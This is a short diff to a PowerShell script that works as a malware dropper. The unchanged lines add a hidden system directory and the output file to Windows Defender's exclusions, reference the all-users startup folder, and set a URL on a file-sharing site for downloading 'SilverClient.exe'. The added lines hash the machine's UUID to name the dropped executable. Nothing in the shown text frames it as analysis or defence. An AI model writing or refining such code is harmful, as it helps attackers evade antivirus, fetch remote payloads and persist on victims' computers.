@@ -4,7 +4,12 @@ $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersS
 New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
+
 $uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
+$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
+$hash = [System.BitConverter]::ToString($md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($uuid)))
+$uuid = $hash -replace "-",""
+
 $url = "https://anonsharing.com/file/36c9e630a3dce435/SilverClient.exe"
 $output = "$dir\$uuid_sigma.exe"
 Add-MpPreference -ExclusionPath $output
